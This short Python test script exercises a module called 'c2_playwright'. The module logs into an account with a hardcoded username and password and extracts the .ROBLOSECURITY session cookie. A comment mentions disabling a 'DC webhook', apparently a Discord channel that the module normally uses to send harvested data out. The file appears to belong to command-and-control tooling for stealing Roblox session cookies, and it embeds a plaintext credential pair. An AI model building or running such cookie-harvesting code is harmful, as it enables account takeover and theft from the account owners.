"""Quick test of the simplified c2_playwright login flow"""
import asyncio, sys
sys.path.insert(0, '.')
import logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s %(message)s')

# Patch to prevent DC webhook from running
import c2_playwright

async def main():
    print("Testing simplified login flow...")
    result = await c2_playwright.login_with_chrome("CheatingHitmanner", "LolKekZek228")
    if result and "cookie" in result:
        print(f"\nSUCCESS! .ROBLOSECURITY: {result['cookie'][:50]}...")
    elif result and "2fa" in result:
        print("\n2FA required")
    else:
        print("\nFAILED - no cookie obtained")

if __name__ == "__main__":
    asyncio.run(main())
